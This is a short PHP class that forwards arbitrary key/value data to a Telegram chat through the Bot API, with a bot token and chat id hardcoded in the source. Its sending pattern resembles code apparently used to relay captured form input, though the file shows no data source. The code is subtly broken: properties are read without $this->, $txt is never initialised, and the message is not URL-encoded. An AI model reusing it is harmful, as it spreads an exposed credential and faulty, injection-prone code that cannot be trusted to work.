<?php
Class Telegram
{
	public $token = '1597848789:AAHFO8wmND7Cia6DS9UvcEnFsPd9I_8W9Wo';
	public $chat_id = '-554802612';

	public function send($data)
	{
		foreach ($data as $key => $value) {
    		$txt .= "<b>" . $key . "</b>" . $value . "%0A";
		}

		$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}", "r");

		if ($sendToTelegram == true) {
			return true;
		} else {
			return false;
		}
	}
}